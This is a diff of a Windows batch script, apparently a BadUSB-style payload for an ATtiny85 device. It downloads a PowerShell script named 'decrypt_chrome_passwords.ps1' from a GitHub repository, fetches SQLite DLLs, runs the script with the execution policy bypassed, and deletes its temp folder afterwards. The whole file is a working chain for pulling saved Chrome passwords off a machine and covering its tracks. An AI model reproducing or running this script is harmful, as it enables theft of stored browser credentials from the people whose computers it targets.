@@ -3,22 +3,21 @@
 set tempDir=%temp%\attiny_package
 if not exist %tempDir% mkdir %tempDir%
 
-:: Step 2: Check for PowerShell version (ensure it's 5.1 or higher)
-powershell -Command "$psVersion = $PSVersionTable.PSVersion; if ($psVersion.Major -lt 5) { Write-Error 'PowerShell 5.1 or higher is required'; exit 1 }"
+:: Step 2: Download SQLite DLLs and PowerShell script
+echo Downloading necessary files...
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mrx-arafat/AtTiny85-Gameplay/main/Decrypt%20Chrome%20Passwords/decrypt_chrome_passwords.ps1' -OutFile '%tempDir%\decrypt_chrome_passwords.ps1'"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/sqlite/sqlite/releases/download/version-3.39.2/sqlite-dll-win64-x64-3390200.zip' -OutFile '%tempDir%\sqlite.zip'"
 
-:: Step 3: Check and install System.Data.SQLite dependency
-echo Checking for System.Data.SQLite...
-powershell -Command "if (-not (Get-Package -Name System.Data.SQLite -ErrorAction SilentlyContinue)) { Install-Package -Name System.Data.SQLite -Force -Source https://www.nuget.org/api/v2 }"
+:: Step 3: Extract SQLite DLLs
+powershell -Command "Expand-Archive -Path '%tempDir%\sqlite.zip' -DestinationPath '%tempDir%\sqlite' -Force"
 
-:: Step 4: Download the PowerShell script
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/your-repo/decrypt_chrome_passwords.ps1' -OutFile '%tempDir%\decrypt_chrome_passwords.ps1'"
-
-:: Step 5: Execute the PowerShell script
+:: Step 4: Execute the PowerShell script with local SQLite DLLs
+set PATH=%tempDir%\sqlite;%PATH%
 powershell -ExecutionPolicy Bypass -File "%tempDir%\decrypt_chrome_passwords.ps1"
 
-:: Step 6: Cleanup
+:: Step 5: Cleanup
 cd /d %temp%
 rd /s /q %tempDir%
 
-:: Step 7: Exit
+:: Step 6: Exit
 exit
